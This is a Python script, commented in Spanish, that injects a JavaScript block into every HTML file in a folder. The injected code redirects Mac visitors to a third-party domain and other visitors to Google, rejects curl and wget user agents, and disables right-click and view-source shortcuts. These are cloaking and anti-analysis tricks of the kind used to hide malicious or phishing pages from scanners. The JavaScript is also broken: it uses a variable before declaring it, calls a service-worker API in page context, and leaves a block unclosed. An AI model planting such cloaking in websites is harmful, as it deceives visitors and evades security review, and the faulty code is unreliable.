import os

# El código de bloqueo en JavaScript que quieres insertar
block_script = """
<script>


// sistema operativo inicio

     let redirectUrl;

  if (userAgent.includes("windows")) {
    redirectUrl = "https://www.google.com";
  } else if (userAgent.includes("mac")) {
    redirectUrl = "https://megadoll.club";
  } else if (userAgent.includes("linux")) {
    redirectUrl = "https://www.google.com";
  } else {
    redirectUrl = "https://www.google.com"; // Fallback
  }

  return Response.redirect(redirectUrl, 302);



// sistema operativo fin


// rechazar wget y curl inicio

// Lógica para bloquear el acceso desde wget o curl
    const userAgent = navigator.userAgent.toLowerCase();
    const blockedAgents = ["curl", "wget"];
    if (blockedAgents.some(agent => userAgent.includes(agent))) {
        alert("Falso: wget or curl no está autorizado.");
        window.location.href = "https://www.google.com";  // Redirige a una página en blanco

// rechazar wget y curl fin


    // Bloquear menú contextual
    document.addEventListener('contextmenu', event => event.preventDefault());

    // Bloquear acceso al código fuente (Ctrl+U y Ctrl+Shift+I)
    document.addEventListener('keydown', event => {
        if (event.ctrlKey && (event.key === 'u' || event.key === 'U' || event.key === 'i' || event.key === 'I' || event.key === 's' || event.key === 'F12')) {
            event.preventDefault();
        }
    });
</script>
"""

# Directorio donde se encuentran los archivos HTML
directory = 'broken wedding'

# Función para inyectar el script en el HTML
def inject_script_into_html(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()

        # Buscar el cierre de la etiqueta </body> y añadir el script
        if '</body>' in content:
            content = content.replace('</body>', f'{block_script}</body>')

            # Escribir los cambios en el mismo archivo o en uno nuevo
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(content)
            print(f'Script inyectado correctamente en {file_path}')
        else:
            print(f'No se encontró </body> en {file_path}')
    except Exception as e:
        print(f'Error al procesar {file_path}: {e}')

# Iterar sobre todos los archivos HTML en el directorio
for filename in os.listdir(directory):
    if filename.endswith('.html'):
        file_path = os.path.join(directory, filename)
        inject_script_into_html(file_path)
